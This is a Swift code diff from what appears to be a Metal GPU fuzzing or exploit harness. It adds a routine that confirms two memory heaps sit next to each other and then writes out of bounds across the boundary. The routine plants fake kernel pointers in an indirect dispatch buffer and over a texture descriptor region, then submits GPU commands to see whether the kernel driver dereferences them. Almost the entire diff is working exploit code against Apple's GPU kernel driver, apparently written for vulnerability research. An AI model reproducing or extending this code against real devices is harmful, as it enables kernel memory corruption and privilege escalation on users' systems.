@@ -513,6 +513,152 @@ func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// Precision corruption: valid dispatch + kernel-ptr poison + IOSurface texture corruption.
+// Phase 1: write valid 1x1x1 grid at h1[0..11], poison h1[12..] with fake kernel ptrs.
+//   If AGX reads past byte 12 → kernel ptr dereference → fault (not a timeout).
+// Phase 2: create IOSurface-backed MTLTexture in h1, corrupt its descriptor bytes via h0 OOB,
+//   blit from it — kernel validates IOSurface ref during submit → may follow corrupted ptr.
+func runPrecisionCorruption(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
+        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
+        step("── Precision Corruption ──────────────────")
+
+        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
+        guard let h0 = device.makeHeap(descriptor: hd),
+              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
+        let actual = h0.size
+
+        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
+              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }
+
+        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
+        let va0 = UInt(bitPattern: p0); let va1 = UInt(bitPattern: p1)
+        let dist = va1 > va0 ? va1 - va0 : va0 - va1
+        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
+        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }
+
+        // Sentinel check
+        for i in 0..<actual { p1[i] = 0xAA }
+        guard p0[actual] == 0xAA else { step("✗ sentinel miss"); completion(); return }
+        step("✓ adjacent + cross-heap read confirmed")
+
+        // ── Phase 1: precision indirect dispatch ──────────────────────────
+        step("── Phase 1: precision indirect dispatch ──")
+        // Valid 1×1×1 at bytes 0..11
+        let validGrid: [UInt8] = [
+            1,0,0,0,  // threadgroupsX = 1
+            1,0,0,0,  // threadgroupsY = 1
+            1,0,0,0   // threadgroupsZ = 1
+        ]
+        for i in 0..<12 { p0[actual + i] = validGrid[i] }
+        // Fake kernel ptrs at bytes 12..63 — looks like FFFFFFXXXXXXXXXX range
+        // AGX kernel driver runs on ARM64, kernel VA is 0xFFFFFFF0_0xxxxxxx
+        let kptr: [UInt8] = [0x08,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]  // LE: 0xFFFFFFF000000008
+        for off in stride(from: 12, to: 64, by: 8) {
+            for b in 0..<8 { p0[actual + off + b] = kptr[b] }
+        }
+        step("  h1[0..11]=valid(1,1,1) h1[12..63]=0xFFFFFFF000000008 fake kptr")
+
+        // Verify via p1
+        var gx: UInt32 = 0
+        for b in 0..<4 { gx |= UInt32(p1[b]) << (b*8) }
+        step("  readback gx=\(gx) (expect 1)")
+
+        // Build compute PSO
+        let src = "#include <metal_stdlib>\nusing namespace metal;\nkernel void noop(uint id [[thread_position_in_grid]]) {}"
+        let lib: MTLLibrary; let pso: MTLComputePipelineState
+        do {
+            lib = try device.makeLibrary(source: src, options: MTLCompileOptions())
+            guard let fn = lib.makeFunction(name: "noop") else { step("fn nil"); completion(); return }
+            pso = try device.makeComputePipelineState(function: fn)
+        } catch { step("✗ compile: \(error.localizedDescription)"); completion(); return }
+        step("  noop PSO compiled")
+
+        guard let cmd1 = queue.makeCommandBuffer(),
+              let enc1 = cmd1.makeComputeCommandEncoder() else { step("cmd1 nil"); completion(); return }
+        enc1.setComputePipelineState(pso)
+        enc1.dispatchThreadgroups(indirectBuffer: b1, indirectBufferOffset: 0,
+                                   threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
+        enc1.endEncoding()
+
+        sl.write("PRECISION DISPATCH — about to commit (valid 1x1x1 + kptr poison at 12..63)")
+        cmd1.addCompletedHandler { cb in
+            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
+            if s == .completed {
+                step("  Phase1 COMPLETED — AGX only reads 12 bytes of indirect buf (kptr poison ignored)")
+            } else if s == .error {
+                step("  *** Phase1 ERROR — AGX faulted on kptr at bytes 12+: \(e)")
+                step("  *** Kernel dereference of fake ptr — KERNEL MEMORY ACCESS")
+            } else { step("  Phase1 status=\(s.rawValue) err=\(e)") }
+        }
+        cmd1.commit()
+        cmd1.waitUntilCompleted()
+
+        // ── Phase 2: IOSurface-backed texture corruption ──────────────────
+        step("── Phase 2: IOSurface texture descriptor corruption ──")
+        // Alloc fresh adjacent pair for texture corruption (h1 is now spent)
+        let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared; hd2.hazardTrackingMode = .untracked
+        guard let hA = device.makeHeap(descriptor: hd2),
+              let hB = device.makeHeap(descriptor: hd2) else { step("hA/hB nil"); completion(); return }
+        let actB = hA.size
+        guard let bA = hA.makeBuffer(length: actB, options: [.storageModeShared, .hazardTrackingModeUntracked]) else { step("bA nil"); completion(); return }
+        // Create IOSurface-backed texture in hB
+        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm, width: 64, height: 64, mipmapped: false)
+        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
+        guard let texB = hB.makeTexture(descriptor: td) else { step("texB nil — hB no space"); completion(); return }
+        let pA = bA.contents().assumingMemoryBound(to: UInt8.self)
+        let vaA = UInt(bitPattern: pA)
+        // Get texB's base VA — textures don't expose contents() but we know hB start
+        guard let probeB = hB.makeBuffer(length: 64, options: .storageModeShared) else { step("probeB nil"); completion(); return }
+        let vaB = UInt(bitPattern: probeB.contents())
+        let distAB = vaB > vaA ? vaB - vaA : vaA - vaB
+        step("  hA va=0x\(String(vaA,radix:16)) hB va≈0x\(String(vaB,radix:16)) dist=0x\(String(distAB,radix:16))")
+        guard distAB == UInt(actB) else { step("  hA/hB not adjacent — phase2 skip"); completion(); return }
+        step("  ✓ adjacent — texB lives in hB starting at 0x\(String(vaB,radix:16))")
+
+        // Fill texB region with sentinel via direct write to hB (via hA OOB)
+        for i in 0..<64 { pA[actB + i] = 0xCC }
+        step("  wrote 0xCC into hB[0..63] via hA OOB (texB descriptor region)")
+
+        // Overwrite with fake IOSurface kernel ptrs at hB[0..31]
+        for off in stride(from: 0, to: 32, by: 8) {
+            for b in 0..<8 { pA[actB + off + b] = kptr[b] }
+        }
+        step("  planted kptr 0xFFFFFFF000000008 at hB[0..31] (texB descriptor)")
+
+        // Blit from texB → forces kernel to validate IOSurface/texture descriptor
+        guard let dstTex = device.makeTexture(descriptor: td) else { step("dstTex nil"); completion(); return }
+        guard let cmd2 = queue.makeCommandBuffer(),
+              let blit = cmd2.makeBlitCommandEncoder() else { step("cmd2 nil"); completion(); return }
+        blit.copy(from: texB, sourceSlice: 0, sourceLevel: 0,
+                  sourceOrigin: MTLOrigin(x:0,y:0,z:0), sourceSize: MTLSize(width:64,height:64,depth:1),
+                  to: dstTex, destinationSlice: 0, destinationLevel: 0,
+                  destinationOrigin: MTLOrigin(x:0,y:0,z:0))
+        blit.endEncoding()
+
+        sl.write("PHASE2 COMMIT — IOSurface texture blit with corrupted descriptor")
+        cmd2.addCompletedHandler { cb in
+            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
+            if s == .completed {
+                step("  Phase2 COMPLETED — texture blit OK despite descriptor corruption")
+                step("  kernel validates texture VA range only, not descriptor contents")
+            } else if s == .error {
+                step("  *** Phase2 ERROR — kernel followed corrupted texture descriptor")
+                step("  *** error: \(e)")
+                step("  *** KERNEL PTR DEREFERENCE — kernel memory access from hB OOB write")
+            } else { step("  Phase2 status=\(s.rawValue)") }
+            step("── Precision Corruption complete ─────────────")
+            completion()
+        }
+        cmd2.commit()
+    }
+}
+
 // Heap boundary cross test.
 // Heaps are spaced exactly actual_size=16384 bytes apart (confirmed via spray).
 // Heaps are CONTIGUOUS — no padding. ptr[actual_size] of heap[0] = ptr[0] of heap[1].
